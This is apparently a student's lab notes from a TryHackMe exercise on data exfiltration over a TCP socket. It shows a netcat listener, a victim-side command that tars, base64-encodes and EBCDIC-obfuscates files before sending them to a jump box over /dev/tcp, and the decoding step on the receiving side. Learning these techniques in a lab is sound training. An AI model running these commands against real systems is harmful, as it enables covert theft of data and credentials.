# Data Exfiltration

## How to use Data Exfiltration
#### Traditional Data Exfiltration
#### C2 Communications
#### Tunneling

## Traditional Data Exfiltration
![exfiltration](https://github.com/nkn-ctrl/TryHackMe/assets/73976100/4b08c31e-0867-49a9-913c-558386ada8a4)  

### Exfiltration using TCP socket

<img src="https://github.com/nkn-ctrl/TryHackMe/assets/73976100/3ef38151-35ff-4e52-9933-f1deaca27a2b" width=600>  

1. The first machine is listening over TCP on port 1337
2. The other machine connects to the port specified in step 1. For example, nc 1.2.3.4 1337
3. The first machine establishes the connection
4. Finally, the sending and receiving data starts. For example, the attacker sends commands and receives results.  

- Listening on port TCP/8080 in the JumpBox
```
thm@jump-box$ nc -lvp 8080 > /tmp/task4-creds.data
Listening on [0.0.0.0] (family 0, port 8080)
```
- Exfiltrate Data over TCP Socket from the victim machine!
```
thm@victim1:$ tar zcf - task4/ | base64 | dd conv=ebcdic > /dev/tcp/[JUMP_BOX_IP]/8080
0+1 records in
0+1 records out
260 bytes copied, 9.8717e-05 s, 2.6 MB/s
```  
- Restoring the tar file
```
thm@jump-box$ cd /tmp/
thm@jump-box:/tmp/$ dd conv=ascii if=task4-creds.data |base64 -d > task4-creds.tar
0+1 records in
0+1 records out
260 bytes transferred in 0.000321 secs (810192 bytes/sec)
```
